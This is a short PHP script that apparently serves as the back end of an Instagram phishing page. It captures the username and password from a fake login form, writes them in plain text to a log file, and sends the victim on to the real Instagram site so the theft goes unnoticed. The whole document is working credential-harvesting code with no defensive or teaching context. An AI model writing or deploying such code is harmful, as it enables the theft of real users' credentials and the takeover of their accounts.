<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    file_put_contents("insta_log.txt", "User: $user | Pass: $pass\n", FILE_APPEND);
    header("Location: https://instagram.com"); // Redirect to real Instagram after fake login
    exit();
}
?>
